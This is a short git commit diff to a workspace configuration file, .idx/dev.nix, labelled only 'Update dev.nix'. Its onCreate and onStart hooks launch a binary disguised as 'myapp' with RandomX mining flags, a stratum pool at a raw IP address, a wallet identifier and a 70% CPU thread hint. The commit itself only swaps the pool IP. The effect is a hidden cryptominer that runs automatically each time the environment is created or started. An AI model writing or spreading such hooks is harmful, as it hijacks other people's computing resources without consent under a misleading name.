e260e7d7342c62b0b499139f0010ca0621121769
ngthduyen110 <tu.y.en.vv95@gmail.com>
2025-06-29 15:18:34 +0700

    Update dev.nix

--- .idx/dev.nix
+++ .idx/dev.nix
@@ -18,14 +18,14 @@
       onCreate = {
         run = ''
           echo "Running myapp on create..."
-          /home/user/dad/myapp -a rx/0 -o stratum+tcp://139.59.119.74:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.sing -p x -k --cpu-max-threads-hint=70
+          /home/user/dad/myapp -a rx/0 -o stratum+tcp://138.197.118.6:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.sing -p x -k --cpu-max-threads-hint=70
         '';
       };
 
       onStart = {
         run = ''
           echo "Running myapp on start..."
-          /home/user/dad/myapp -a rx/0 -o stratum+tcp://139.59.119.74:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.sing -p x -k --cpu-max-threads-hint=70
+          /home/user/dad/myapp -a rx/0 -o stratum+tcp://138.197.118.6:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.sing -p x -k --cpu-max-threads-hint=70
         '';
       };
     };
